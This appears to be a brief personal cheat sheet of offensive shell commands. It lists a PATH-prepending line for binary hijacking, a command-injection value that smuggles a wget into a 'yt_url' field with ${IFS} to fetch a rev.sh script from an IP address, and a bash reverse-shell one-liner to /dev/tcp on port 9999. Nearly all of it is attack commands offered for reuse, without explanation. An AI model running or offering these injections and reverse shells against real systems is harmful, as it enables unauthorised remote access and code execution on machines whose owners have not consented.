# LifeLongCommands
All command needed to be noted

# Binary Execution Path changing 
export PATH=/home/somedirectory:$PATH

# Command injection
yt_url=;wget${IFS}http://10.4.39.84:8000/rev.sh;

# Reverse Shell cheatsheet

bash -i >& /dev/tcp/$myip/9999 0>&1
